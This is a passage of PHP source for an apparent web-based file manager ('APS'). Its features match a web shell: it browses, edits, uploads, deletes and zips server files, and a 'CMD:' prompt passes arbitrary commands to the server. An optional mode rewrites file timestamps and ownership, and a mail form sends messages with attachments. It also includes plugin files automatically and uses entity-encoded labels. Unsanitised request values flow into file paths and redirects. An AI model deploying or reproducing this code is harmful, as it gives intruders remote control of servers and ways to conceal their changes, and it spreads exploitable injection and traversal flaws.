 $msg='<b>'.p_aps($p[1]).'</b> was created!';
  header('Location:'.s_aps($s[3])); break;
case(p_aps($p[2]) && p_aps($p[3])):
  @file_put_contents(g_aps($g[0]).p_aps($p[3]),(p_aps($p[16])?$dec:(p_aps($p[17])?$enc:(p_aps($p[7])?$trim:(p_aps($p[6])?$uml:p_aps($p[2]))))));
 $msg='<b>'.p_aps($p[3]).'</b> was created!';
  header('Location:'.s_aps($s[3])); break;
case(p_aps($p[2])||p_aps($p[12])):
   @file_put_contents($tx,(p_aps($p[14])?$repl:(p_aps($p[16])?$dec:(p_aps($p[17])?$enc:(p_aps($p[7])?$trim:(p_aps($p[6])?$uml:p_aps($p[2])))))));
  if(SECURITY==='OFF'){
  @touch($tx,$fim);@chown($tx,$fio);
  @chgrp($tx,$fig);@touch($tx,$fia);}
 $msg='<b>'.basename($tx).'</b> was saved!';
  header('Location:'.s_aps($s[3])); break;
case(g_aps($g[8])):
  $f=g_aps($g[0]).g_aps($g[8]);
 if(is_dir($f)){DDel($f);}
 else if(is_file($f)){@unlink($f);}
 $msg='<b>'.g_aps($g[8]).'</b> was deleted!';
  header('Location:'.str_replace('&'.$g[8].'='.g_aps($g[8]),'',urldecode(s_aps($s[3])))); break;
case(g_aps($g[7])):
  $_SESSION['c_d']=g_aps($g[7]);
  $_SESSION['c_v']=g_aps($g[0]);
  header('Location:'.str_replace('&'.$g[7].'='.g_aps($g[7]),'',urldecode(s_aps($s[3])))); break;
case(g_aps($g[6])||g_aps($g[19])):
  $f=$copy_verz.$copy_datei;
  $t=g_aps($g[0]).$copy_datei;
 is_dir($f)?DCopy($f,$t):@copy($f,$t);
 if(g_aps($g[19])){!is_dir($f)?@unlink($f):DDel($f);unset($_SESSION['c_d'],$_SESSION['c_v']);
 $msg='<b>'.g_aps($g[19]).'</b> was duplicated!';
  header('Location:'.str_replace('&'.$g[19].'='.g_aps($g[19]),'',urldecode(s_aps($s[3]))));}
 else{
 $msg='<b>'.g_aps($g[6]).'</b> was duplicated!';
  header('Location:'.str_replace('&'.$g[6].'='.g_aps($g[6]),'',urldecode(s_aps($s[3]))));}
 $msg='<b>'.$copy_datei.'</b> was duplicated!'; break;
case(g_aps($g[4])):
  $nn=basename(g_aps($g[0]).g_aps($g[5]));
 if(!file_exists(g_aps($g[0]).g_aps($g[5])) && $nn!='' && $nn!='null'){
 if(is_writeable(g_aps($g[0]).g_aps($g[4]))){
 if(@rename(g_aps($g[0]).g_aps($g[4]),g_aps($g[0]).g_aps($g[5]))){
 $msg='<b>'.g_aps($g[4]).'</b> was renamed!';
  header('Location:'.str_replace('&'.$g[4].'='.g_aps($g[4]).'&'.$g[5].'='.g_aps($g[5]),'',urldecode(s_aps($s[3]))));}}} break;
case(g_aps($g[13])):
  $sort='';
 if(g_aps($g[13])==='down'){rsort($inh_aps);
  $sort='&amp;'.$g[13].'=down';
 $msg='Sort down was successfully!';}
 else if(g_aps($g[13])==='up'){sort($inh_aps);
  $sort='&amp;'.$g[13].'=up';
 $msg='Sort up was successfully!';} break;
  clearstatcache();
end_switch;}
////////////////////////////////////////////////// end of "Commands" ///////////////////////////////////////////////////////

 $_SESSION['msg']=$msg;

foreach($inh_aps as $datei){
 $fda=g_aps($g[0]).$datei;
 $rp_fda=str_replace(realpath(s_aps($s[0])),'',realpath($fda));
 $az=(g_aps($g[20])?(!strstr($bst,$datei[0])?'<strong style="color:red;">&nbsp;'.($bst=$datei[0]).'&nbsp;</strong>':''):'');
 $az_nr=(g_aps($g[20])&&g_aps($g[21])?'-':'');
 $sta=@stat($fda);
$processUser = posix_getpwuid(posix_geteuid());

 $s_fim=$sta['mtime'];$s_fia=$sta['atime'];$s_fiu=$sta['uid'];$s_fig=$sta['gid'];$s_fmo=$sta['mode'];$s_fic=@fileperms($fda);
 $inf="<span style=\"font-size:80%;color:#C0C0C0;\">Perm:&nbsp;<a href=\"javascript:var%20s=prompt('','".decoct(@fileperms($fda))."');window.location='".s_aps($s[3])."&".$g[31]."=".$datei."&".$g[2]."='+s\">".(decoct(@fileperms($fda))?decoct(@fileperms($fda)):'???')."</a>&nbsp;|&nbsp;User:&nbsp;<a href=\"javascript:var%20s=prompt('','".$processUser['name']."');window.location='".s_aps($s[3])."&".$g[31]."=".$datei."&".$g[18]."='+s\" title=\"User/Owner\">".($processUser['name']?$processUser['name']:'???')."</a>
&nbsp;|&nbsp;Group:&nbsp;<a href=\"javascript:var%20s=prompt('','".$processUser['gid']."');window.location='".s_aps($s[3])."&".$g[31]."=".$datei."&".$g[27]."='+s\">".($processUser['gid']?$processUser['gid']:'???')."</a></span></nobr><br>&nbsp;<nobr style=\"font-size:80%;color:#C0C0C0;\">Modified&#58;&nbsp;<i><a href=\"javascript:var%20s=prompt('','".date('d.m.Y H:i:s',$s_fim)."');window.location='".s_aps($s[3])."&".$g[31]."=".$datei."&".$g[17]."='+s\">".($s_fim?date('d.m.Y H:i:s ',$s_fim)."</a>[".intval((time()-$s_fim)/86400):'[???')."&nbsp;&#68;&#97;&#121;&#115;]</i></nobr>\n&nbsp;<nobr style=\"font-size:80%;color:#C0C0C0;\">&#67;&#114;&#101;&#97;&#116;&#101;&#58;&nbsp;<i><a href=\"javascript:var%20s=prompt('','".date('d.m.Y H:i:s',$s_fia)."');window.location='".s_aps($s[3])."&".$g[31]."=".$datei."&".$g[16]."='+s\">".($s_fia?date('d.m.Y H:i:s ',$s_fia)."</a>[".intval((time()-$s_fia)/86400):'[???')."&nbsp;&#68;&#97;&#121;&#115;]</i></nobr>";

////////////////////////////////////////////////// start of "Datei actions" ///////////////////////////////////////////////////////
 $bef_del="<a href=\"javascript:(confirm('are you shure to delete \'".$datei."\'')==false)?stop():location.href='".s_aps($s[3])."&amp;".$g[8]."=".$datei."';\" style=\"color:red;\" title=\"&#100;&#101;&#108;&#101;&#116;&#101;\"><b>&nbsp;&#215;&nbsp;</b></a>|";
 $bef_cc='<a href="'.s_aps($s[3]).'&amp;'.$g[7].'='.$datei.'" style="color:white;" title="&#99;&#111;&#112;&#121;&nbsp;&#79;&#82;&nbsp;&#99;&#117;&#116;">&nbsp;&copy;&nbsp;</a>|';
 $bef_ren="<a href=\"javascript:name=prompt('".$g[4].":','".$datei."');location.href='".s_aps($s[3])."&amp;".$g[4]."=".$datei."&amp;".$g[5]."='+name\" style=\"color:#66FF00;\" title=\"&#114;&#101;&#110;&#97;&#109;&#101;\">&nbsp;&asymp;&nbsp;</a>|";
 $bef_downl='<a href="'.s_aps($s[3]).'&amp;'.$g[22].'='.$datei.'" style="color:lightblue;" title="&#100;&#111;&#119;&#110;&#108;&#111;&#97;&#100;">&nbsp;&#208;&nbsp;</a>|';
 $bef_view="<a href=\"#\" onclick=\"window.open('".$rp_fda."','".basename($rp_fda)."','width=800px,height=600px,top=150px,left=200px,scrollbars=yes,toolbar=no,status=no,style=filter,resizable=yes,menubar=no,location=no,directories=no');\" title=\"&#118;&#105;&#101;&#119;\">&nbsp;&#86;&nbsp;</a>|";
 $bef_zip='<a href="'.s_aps($s[3]).'&amp;'.$g[29].'='.$datei.'" style="color:orange;" title="&#122;&#105;&#112;&#112;">&nbsp;Z&nbsp;</a>';                           
 $bef_unzip='<a href="'.s_aps($s[3]).'&amp;'.$g[30].'='.$datei.'" style="color:green;" title="&#40;&#117;&#110;&#41;&#122;&#105;&#112;&#112;">&nbsp;UZ&nbsp;</a>';
////////////////////////////////////////////////// end of "Datei actions" ///////////////////////////////////////////////////////

if(is_dir($fda)){
if(!in_array($datei,array('.?'.$g[0].'='.g_aps($g[0]).'.','/&#35;(.*?)/i',(isset($hide_dir)?$hide_dir:'')))){
if(preg_match("/$filter/i",$datei)){
 $d=@dir(g_aps($g[0]).$datei);
 $d_dir='<p style="background:#222;">';
while(false!==($e=$d->read())){
if(preg_match('/^..?$/',$e))continue; 
if(is_dir(g_aps($g[0]).$datei.'/'.$e))
 $d_dir.='&#9500;&#9472;&nbsp;<a href="?'.$g[0].'='.g_aps($g[0]).$datei.'/'.$e.'/">'.ucfirst($e).'</a><br>';
elseif(!is_dir(g_aps($g[0]).$datei.'/'.$e))
 $d_dir.=false;}
 $d_dir.='</p>';

 $bef='&#91;'.$bef_del.$bef_cc.$bef_ren.$bef_zip.'&#93;<br>';
 $nr=(g_aps($g[21])?'<strong style="color:#FF0033;">&nbsp;'.$fol_nr.'&nbsp;</strong>':'');
 $fol.="<fieldset><legend>".$az.$az_nr.$nr."<a href=\"?".$g[0]."=".$fda."/\" name=\"".$datei."\">&nbsp;".ucfirst($datei)."&nbsp;</a>&nbsp;::&nbsp;<small style=\"color:white;\">".(BITES($fda)?BITES($fda):'???')."</small></legend>&nbsp;".$bef.'&nbsp;'.$inf."\n".$d_dir."</fieldset>";$fol_nr++;}}}
else if(preg_match("/$filter/i",$datei)){
if(!in_array($datei,array('.ftpquota','&#46;ftpquota','/&#35;(.*?)/i',(isset($hide_file)?$hide_file:'')))){
 $met=@get_meta_tags($fda);
 $type=pathinfo($fda);
 $type=isset($type['extension'])?$type['extension']:$datei;
 $nr=(g_aps($g[21])?'<strong style="color:#FF0033;">&nbsp;'.$fil_nr.'&nbsp;</strong>':'');
 $bef='&#91;'.$bef_del.$bef_cc.$bef_ren.$bef_downl.(in_array($type,array($exec_type[2],$exec_type[3],$exec_type[11],$exec_type[12]))?$bef_unzip:$bef_view.$bef_zip).'&#93;';$fil_nr++;

////////////////////////////////////////////////// start of "File search" ///////////////////////////////////////////////////////
if($suche_t){
if(strlen($suche_t)>=1 && $suche_t!='null'){
 $um=strtr($suche_t,array('?'=>array('&auml;','&ouml;','&uuml;','&szlig;')));
 $texts=@file_get_contents($fda);
if(strstr($texts,$suche_t)||strstr($texts,$um)){
if(basename($fda) !== basename(__FILE__)){
 $found=substr_count($texts,$suche_t)<1?substr_count($texts,$um):substr_count($texts,$suche_t);
 $fil.= '<div style="float:left;">&nbsp;<a href="?'.$g[0].'='.g_aps($g[0]).'&amp;'.$g[1].'='.$datei.'&amp;'.$g[31].'='.$datei.'" style="color:#EE9A49;">'.$found.'&nbsp;x</a>&nbsp;</div>';}}}}
////////////////////////////////////////////////// end of "File search" ///////////////////////////////////////////////////////

////////////////////////////////////////////////// start of "Organisation to Fileformat" //////////////////////////////////////
if(in_array($type,$img_type)){$fil.= '<fieldset><legend>'.$fil_fi.$az.$az_nr.$nr.'<a href="?'.$g[0].'='.g_aps($g[0]).'&amp;'.$g[10].'='.$datei.'#'.$datei.(g_aps($g[12])?'&amp;'.$g[12].'='.g_aps($g[12]):'').'" name="'.$datei.'">&nbsp;'.$datei.'&nbsp;</a>&nbsp;::&nbsp;<small style="color:white;">'.(BITES($fda)?BITES($fda):'???').'</small></legend><a href="?'.$g[0].'='.g_aps($g[0]).'&amp;'.$g[10].'='.$datei.'#'.$datei.'" style="float:left;">'.(isset($fil_s)?$fil_s:'').'<img src="'.$rp_fda.'#'.$datei.'" alt="'.$datei.'" width="60px" height="60px" /></a>&nbsp;&nbsp;<nobr>'.$bef.'</nobr><br>&nbsp;<nobr>'.$inf.'</fieldset>';}
else if(in_array($type,$mov_type)){$fil.= '<fieldset><legend>'.$fil_fi.$az.$az_nr.$nr.'<a href="?'.$g[0].'='.g_aps($g[0]).'&amp;'.$g[35].'='.base64_encode($datei).'" name="'.$datei.'">&nbsp;'.$datei.'&nbsp;</a>&nbsp;::&nbsp;<small style="color:white;">'.(BITES($fda)?BITES($fda):'???').'</small></legend><nobr>'.$bef.'</nobr><br>&nbsp;<nobr>'.$inf.'</fieldset>';}
else if(in_array($type,$exec_type)){$fil.= '<fieldset><legend>'.$fil_fi.$az.$az_nr.$nr.'<a href="'.$rp_fda.'" name="'.$datei.'">&nbsp;'.$datei.'&nbsp;</a>&nbsp;::&nbsp;<small style="color:white;">'.(BITES($fda)?BITES($fda):'???').'</small></legend><nobr>&nbsp;'.$bef.'</nobr><br>&nbsp;<nobr>'.$inf.'</fieldset>';}
else{$fil.= '<fieldset><legend>'.$fil_fi.$az.$az_nr.$nr.$fil_s.($met?'[<a href="'.s_aps($s[3]).'&amp;'.$g[26].'='.$datei.'"><small>&#84;</small></a>]':'').(g_aps($g[14])!==$datei?'&nbsp;[<a href="?'.$g[0].'='.g_aps($g[0]).'&amp;'.$g[14].'='.$datei.(isset($sort)?$sort:'').'"><small>&#64;</small></a>]':'').'<a href="?'.$g[0].'='.g_aps($g[0]).'&amp;'.$g[1].'='.$datei.(g_aps($g[12])?'&amp;'.$g[12].'='.g_aps($g[12]):'').(isset($sort)?$sort:'').'" name="'.$datei.'">&nbsp;'.ucfirst($datei).'&nbsp;</a>&nbsp;::&nbsp;<small style="color:white;">'.(BITES($fda)?BITES($fda):'???').'</small></legend><nobr>&nbsp;'.$bef.'</nobr><br>&nbsp;<nobr>' .$inf.'</fieldset>';}
////////////////////////////////////////////////// end of "Organisation to Fileformat" ///////////////////////////////////////////////////////

 array_push($filter_link,'<a href="'.s_aps($s[3]).'&amp;filter='.$type.'">'.$type.'</a>&nbsp;');}}}
 
 $status=$status!=''?'&nbsp;|&nbsp;<samp>&thinsp;&nbsp;'.$status.'</samp>':$status;
 $filter_link=implode('',array_unique($filter_link));
 $filter_link=g_aps($g[12])?g_aps($g[12]):$filter_link;
 $fi="<a href=\"javascript:var%20f=prompt('&#87;&#104;&#105;&#99;&#104;&nbsp;&#111;&#116;&#104;&#101;&#114;&nbsp;&#70;&#105;&#108;&#116;&#101;&#114;&#63;&nbsp;','');location.href='".s_aps($s[3])."&amp;filter='+f\">&#70;&#105;&#108;&#116;&#101;&#114;</a>:&nbsp;";
 ($titel?$fil.=($met?preg_match('/<title>(.*?)</i',@file_get_contents($fda),$titel).($titel[2]?'&bdquo;'.$titel[2].'&rdquo;<br>'.delete($titel[1]):'').($met['author']?'<u style="color:#FF0033;">&#65;&#117;&#116;&#111;&#114;&#58;</u>&nbsp;'.$met['author'].'<br>':'').($met['description']?'<u style="color:#FF0033;">&#66;&#101;&#115;&#99;&#104;&#114;&#101;&#105;&#98;&#117;&#110;&#103;&#58;</u>&nbsp;'.$met['description']:''):''):'');
  clearstatcache();

// Organisation to edditing //////////////////////////////////////////////////////////////////////////////////////////////////////
if(g_aps($g[10])){$end_code=("<a href=\"#\" onclick=\"window.open('".str_replace(realpath(s_aps($s[0])),'',realpath(g_aps($g[0]).g_aps($g[10])))."','popup','width=600px,height=450px,scrollbars=yes,toolbar=no,status=no,style=no,resizable=yes,menubar=no,location=no,directories=no,top=50px,left=100px');\"><img src=\"".str_replace(realpath(s_aps($s[0])),'',realpath(g_aps($g[0]).g_aps($g[10])))."\" alt=\"".g_aps($g[10])."\" width=\"100%\" height=\"97%\" target=\"_blank\" style=\"position:relative; margin-top:2%; z-index:0;\" /></a>");}

else if(g_aps($g[35])){

$end_code= ('<div style="position:fixed; margin-left: 2px; margin-top: 22px; width: 80%; height: 40px; overflow: hidden; color:'.$background_txt.'; background: #333; z-index: 2;">
<h2 style="margin-left: 20px; margin-top: 10px;">'.base64_decode(g_aps($g[35])).'</h2></div><div class="s_erg">

<video width="960" height="700" autoplay controls>
<source src="'.str_replace(realpath(s_aps($s[0])),'',realpath(g_aps($g[0]).base64_decode(g_aps($g[35])))).'" type="video/'.substr(base64_decode(g_aps($g[35])), -3).'">
<source src="'.str_replace(realpath(s_aps($s[0])),'',realpath(g_aps($g[0]).base64_decode(g_aps($g[35])))).'" type="video/ogg">Does not Browser.</video></div>');}

else if($suche_t && !g_aps($g[1]) && g_aps($g[34]) === 'recursiv'){
 $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator(g_aps($g[0])));
 $f=array();
foreach ($it as $in){$f[] = $in->getPathname();}
foreach(array_reverse($f) as $file){
if(basename($file) === '.' || basename($file) === '..' || basename($file) === basename(__FILE__)) continue;
 $texts = file_get_contents($file);
if(strstr($texts,$suche_t)){
 $fo=substr_count($texts,$suche_t)<1?substr_count($texts,$um):substr_count($texts,$suche_t);
 $xxx.= '<p><strong>'.$fo.' x</strong> <a href="?action='.str_replace(basename($file), '', $file).'&qt='.basename($file).'" target="_blank">'.str_replace(realpath(s_aps($s[0])), '', $file).'</a></p>';}
$end_code= ('<div style="position:fixed; margin-left: 2px; margin-top: 22px; width: 80%; height: 40px; overflow: hidden; color:'.$background_txt.'; background: #333; z-index: 2;"><h2 style="margin-left: 20px; margin-top: 10px;">Suchergebnis</h2></div><div class="s_erg">'.$xxx.'</div>');}}
else {$end_code=('<textarea disabled cols="4" rows="'.(is_file($tx)?intval(count(file($tx))+2):'300').'" style="position:absolute; width:3%; color:'.$background_txt.'; background:'.$color_txt.'; padding:2% 0 0 0; text-align:center; border-right:1px groove '.$color_txt.'; z-index:2; overflow:hidden;" wrap="off">'.(isset($num)?$num:'').'</textarea>
<textarea name="inhalt" cols="1000" rows="'.(is_file($tx)?intval(count(file($tx))+1):'300').'" style="color:'.$color_txt.'; background:'.$background_txt.'; padding:2% 0 0 4%; overflow:hidden;" wrap="off">'.(g_aps($g[14])=='new'?$mail_txt:(isset($cod)?$cod:'')).'</textarea>');}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Form Feld /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$inhp='1&nbsp;<input type="file" name="upl[]" size="11%" />&nbsp;&nbsp;2&nbsp;<input type="file" name="upl[]" size="11%" />&nbsp;&nbsp;3&nbsp;<input type="file" name="upl[]" size="11%" />&nbsp;';
$form=(g_aps($g[14])?('<fieldset><legend>Adress</legend>
Save&nbsp;<input type="checkbox" name="m_save" />&nbsp;&#70;&#114;&#111;&#109;&#58;&nbsp;&nbsp;<input type="text" name="e_em2" value="'.$from_mail.'" size="20%" onclick="this.select();" />&nbsp;&nbsp;
&#84;&#97;&#114;&#103;&#101;&#116;&#58;&nbsp;<input type="text" name="e_em" value="'.$target_mail.'" size="20%" onclick="this.select();" />&nbsp;&nbsp;
&#84;&#105;&#116;&#108;&#101;&#58;&nbsp;&nbsp;<input type="text" name="titel" value="'.$titel_mail.'" size="20%" onclick="this.select();" /></fieldset>
<fieldset><legend>&#65;&#116;&#116;&#97;&#99;&#104;&#109;&#101;&#110;&#116;</legend>'.$inhp.'</fieldset>'):('
<fieldset><legend>Search</legend><input type="text" size="20px" name="search"><input type="submit" name="recursiv" value="List" /></fieldset>
<fieldset><legend>&#66;&#101;&#97;&#117;&#116;&#121;&#32;&#67;&#111;&#100;&#101;</legend>&#198;<input type="checkbox" name="uml" />&nbsp;&nbsp;&nbsp;&#153;<input type="checkbox" name="trim" /></fieldset>
<fieldset><legend>&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;</legend>&#x64;&#x65;&#x63;<input type="checkbox" name="dec" />&nbsp;&nbsp;&nbsp;&#x65;&#x6e;&#x63;<input type="checkbox" name="enc" /></fieldset>
<fieldset><legend>Replace</legend>&#84;&#104;&#105;&#115;&#58;&nbsp;<input type="text" name="rep" size="6%" value="'.(g_aps($g[15]) && g_aps($g[1])==g_aps($g[31])?g_aps($g[15]):'').'" onclick="this.select();" />&nbsp;&nbsp;&#84;&#111;&#58;&nbsp;<input type="text" name="n_rep" size="6%" />&nbsp;</fieldset>
<fieldset><legend>&#78;&#101;&#119;&#32;&#68;&#105;&#114;&#32;&#111;&#114;&#32;&#70;&#105;&#108;&#101;</legend>&#68;&#105;&#114;&#58;&nbsp;&nbsp;<input type="text" name="new_dir" size="8%" />&nbsp;&nbsp;&#70;&#105;&#108;&#101;&#58;&nbsp;<input type="text" name="titel" size="8%" /></fieldset>
<fieldset><legend>&#70;&#105;&#108;&#101;&#32;&#85;&#112;&#108;&#111;&#97;&#100;</legend>'.$inhp.'</fieldset>'));

if(!empty($input)){$x=4;
 $form.='<br><fieldset><legend>'.(g_aps($g[14])?'more Attachments':'more File Uploads').'</legend>&nbsp;&nbsp;';
while($x<=$input){
 $form.='&nbsp;'.$x.'&nbsp;<input type="file" name="upl[]" size="11%" /> ';$x++;}
 $form.='</fieldset>';}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Directory Container ///////////////////////////////////////////////////////////////////////////////////////////////////////////
if($chdir=dirname(g_aps($g[0])))chdir($chdir);

$verz_menue=(g_aps($g[3])==='hide'?'':'<div id="verz" class="list">
<div id="folder_list">'.$fol.'</div>
<div id="file_info">
<small><nobr style="text-align:center;">&nbsp;&nbsp;&#71;&#101;&#115;&#58;&nbsp;'.BITES(g_aps($g[0])).'&nbsp;&nbsp;&#70;&#111;&#108;&#100;&#101;&#114;&#58;&nbsp;<a href="'.s_aps($s[3]).'&amp;'.$g[21].'='.$g[21].(isset($sort)?$sort:'').'"><b>'.$fol_nr.'</b></a>&nbsp;/&nbsp;&#70;&#105;&#108;&#101;&#115;&#58;&nbsp;<a href="'.s_aps($s[3]).'&amp;'.$g[21].'='.$g[21].(isset($sort)?$sort:'').'"><b>'.$fil_nr.'</b></a></nobr></small>
<br>
<nobr class="tabs"><a href="javascript:history.back()">&nbsp;&lt;&nbsp;</a>&nbsp;<a href="javascript:history.forward()">&nbsp;&gt;&nbsp;</a>&nbsp;<a href="?'.$g[0].'='.(AUTHENT?s_aps($s[0]).'/':s_aps($s[0])).'/">&nbsp;S&nbsp;</a>&nbsp;<a href="?'.$g[0].'='.$sd.'/">&nbsp;H&nbsp;</a>&nbsp;<a href="?'.$g[0].'='.$cwd.'&amp;'.$g[1].'='.$sbht.'">&nbsp;&equiv;&nbsp;</a>&nbsp;<a href="?'.$g[0].'='.$chdir.'/">&nbsp;../&nbsp;</a>&nbsp;&nbsp;<a href="'.s_aps($s[3]).'&amp;'.$g[13].'=up">&uarr;</a>&nbsp;<a href="'.s_aps($s[3]).'&amp;'.$g[13].'=down">&darr;</a>&nbsp;<a href="'.s_aps($s[3]).'&amp;'.$g[20].'='.$g[20].(isset($sort)?$sort:'').'">&#65;&#45;&#90;</a>&nbsp;<a href="'.s_aps($s[3]).'&amp;'.$g[21].'='.$g[21].(isset($sort)?$sort:'').'">&#49;&#45;&#57;</a></nobr>
<br>
<nobr><small>'.($filter_link?'&nbsp;&nbsp;'.$fi.'[&nbsp;<i>'.$filter_link.'</i>]':'').'</small></nobr></div>
<div id="file_list">'.$fil.'</div></div>');
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// plugin ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
if(is_dir(dirname(__FILE__)."/inc")){
 $ms='';
foreach(@scanDir(dirname(__FILE__).'/inc','2') as $fo){
if(preg_match('/^..?$/',$fo))continue; 
 @include(dirname(__FILE__)."/inc/".$fo);
 $ms.='<option value="?'.$g[0].'='.(AUTHENT?str_replace('\\','/',dirname(__FILE__)):dirname(__FILE__)).'/inc/&'.$g[1].'='.$fo.'">'.$fo.'</option>';$ff=$fo;}
 $status.="&nbsp;|&nbsp;<b>Plugin: </b><select size=\"1\" onchange=\"location=this.value\">
 <option selected disabled>&nbsp;&nbsp;inc</option>".$ms."
 </select>".($bottom?$bottom:'');}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// CSS ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$APS_CSS=<<<APS_CSS
<style type="text/css">
html {margin:0;line-height:normal;height:99%;font-size:85%;}
body {margin:0; overflow:hidden; background:$background_style; color:$color_style; font-family:sans-serif,Verdana,Helvetica,"comic sans ms",Arial,"COURIER NEW",Tahoma;SCROLLBAR-HIGHLIGHT-COLOR:#DFDFDF; SCROLLBAR-ARROW-COLOR:#FFF; SCROLLBAR-BASE-COLOR:#000;}
input, select {border:2px inset $color_style; border-radius:6px; background:$background_style; color:$color_style;}
textarea {font-size:120%; border:0;}
a:link {color:#00FFFF; text-decoration:none;}
a:visited {font-weight:bold; color:#0090E0; text-decoration:none;}
a:focus {font-weight:bold; color:red; text-decoration:none;}
a:hover {color:#8F8F8F; text-decoration:none;}
.tabs {background:$color_txt; padding:1px;}
.tabs a {background:$background_txt; padding:0 2px 0 2px; text-align:center; border:1px outset $background_txt; border-radius:10px; color:$color_txt;}
.tabs a:hover {background:$background_style; color:$color_style;}
hr {width:100%; background:#00ff00; height:1px; margin:0; border:0;}
fieldset {background:$background_txt; border:0;}
#infd {position:absolute; width:100%; height:4%; padding:2px; border-top:4px groove $background_style; overflow-y:auto; overflow-x:hidden; z-index:2;}
#verz {position:fixed; right:1%; top:5%; width: auto; max-width: 340px; height:86%; background:none; overflow:hidden; z-index:2; $transp}
#file_info {width:92%; clear:both; border:2px groove $background_txt; border-radius:15px; padding:6px; background:$background_style; overflow:none;}
#folder_list {width:96%; height:35%; border:2px groove $background_txt; border-radius:15px; background:$background_style; overflow:auto;}
#file_list {width:96%; height:50%; border:2px groove $background_txt; border-radius:15px; background:$background_style; overflow:auto;}
#form {position:absolute; width:99%; height:18px; border-bottom:4px groove $background_style; background:$background_style; color:$color_style; $transp z-index:5; overflow:hidden; $transp}
#form fieldset {float:left; border:1px groove $background_style; background:$color_txt; color:$background_txt;}
#form legend {border:1px inset $color_style; border-radius:5px; padding-left:2px; padding-right:2px;}
.list fieldset {height:2px; padding:2px; background:$background_style; border:2px groove $background_txt; border-radius:15px; overflow:hidden; z-index:3;}
.list fieldset:hover {height:auto; overflow:none; z-index:4;}
.list legend a {height:3%; font-size:100%;}
.filt {height:2px; border:2px inset $color_style; border-radius:6px; background:$background_style; overflow:hidden; z-index:3;}
.filt:hover {height:auto; z-index:4;}
.s_erg {position: absolute; left: 30px; top: 80px; width: 100%; height: auto; overflow: auto; padding: 10px;}
.s_erg strong {float:left; width: 70px;}
</style>
APS_CSS;
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 $G_0=g_aps($g[0]);$G_1=g_aps($g[1])?g_aps($g[1]):basename($rpstr);
 $S_1=s_aps($s[1]);$S_2=!g_aps($g[14])?'save':'send';$S_3=s_aps($s[3]);
 $S_4 = s_aps($s[3]).'&stxt=del';
 $S_5 = urlencode("'$S_3&suche='+s");
 $m_s=str_replace('&m=hide','',s_aps($s[3]));
 $p_10=p_aps($p[10]);$loc_v=isset($loc_v)?$loc_v:'';
 $flow=(g_aps($g[1])||g_aps($g[14])||g_aps($g[34])?'auto':'hidden');
 $dinfo=(isset($msgg)?"&nbsp;|&nbsp;<strong style=\"color:green;\">$msgg</strong>":$dinfo);
 $su_tx = !empty($suche_t) ? '&nbsp;|&nbsp;&nbsp;&nbsp;&#83;&#101;&#97;&#114;&#99;&#104;&nbsp;&#102;&#111;&#114;&#58;&nbsp;<input type="text" size="60" disabled style="padding:0px !important; color:#EE9A49;" value="'.$suche_t.'"><small>[<a href="'.$S_4.'" style="color:#FF4040;">x</a>]</small>' : '';
// HTML //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$APS_HTML=<<<APS_HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head><title>$rp</title></head>
<body>
<form action="" method="post" enctype="multipart/form-data">
<div style="width:100%;">
<input type="submit" value="$S_2" style="float:left; border:0; background:#A8A8A8; color:#000;" />|<input type="reset" value="reset" style="border:0; background:#A8A8A8; color:#00FF7F;" /><span class="tabs">|<a href="$S_3&m=hide">&nbsp;h&nbsp;</a><a href="$m_s">&nbsp;s&nbsp;</a>|<a href="?$g[0]=$ggg">&nbsp;&#108;&#111;&#103;&#111;&#117;&#116;&nbsp;</a>|<a href="javascript:var%20s=prompt('CMD:','dir c:>/c.txt');location.href='$S_3&amp;$g[25]='+s.toLowerCase()">&nbsp;&#9607;&nbsp;</a>
$em<a href="#" onclick="window.open('$rp','{basename($rp)}','width=800px,height=600px,top=50px,left=100px,scrollbars=yes,toolbar=no,status=no,style=filter,resizable=yes,menubar=no,location=no,directories=no');">&nbsp;&#86;&#105;&#101;&#119;&nbsp;</a>
<a href="javascript:location.reload()">&nbsp;&sub;&sup;&nbsp;</a><a href="#" onclick="window.open('?$g[32]=pinfo','popup','width=800px,height=600px,scrollbars=yes,toolbar=no,status=no,resizable=yes,menubar=no,location=no,directories=no,top=50px,left=100px').focus();return false;" target="popup">&nbsp;&#73;&#110;&#102;&#111;&nbsp;</a>|<a href="javascript:(confirm('Would you LOCK [$chmg_s]?')==false)?stop():location.href='$S_3&amp;$g[31]=$G_1&amp;$g[2]=$chmg_s';">&#45</a><a href="javascript:(confirm('Would you UNLOCK [$chmg_e]?')==false)?stop():location.href='$S_3&amp;$g[31]=$G_1&amp;$g[2]=$chmg_e';">&#43</a></span>&nbsp;$loc_v&nbsp;<i>$brkr</i></div>
<div id="form" onmouseover="style.height='auto'" onmouseout="style.height='18px'">$form</div>
<div style="position:relative; margin:0; border:0; width:100%; height:94%;">
<div style="position:relative; margin:0; border:0; width:100%; height:100%; overflow:$flow;">$end_code</div></div>
<div id="infd">&nbsp;&nbsp;$dinfo&nbsp;$einf_info<i>$status&nbsp;$cache</i>$su_tx<hr>&nbsp;&nbsp;<span>&#80;&#72;&#80;&#58;&nbsp;<u>$ph_i</u></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span>&#85;&#45;&#78;&#97;&#109;&#101;&#58;&nbsp;<u>$ph_u</u></span>&nbsp;&nbsp;|
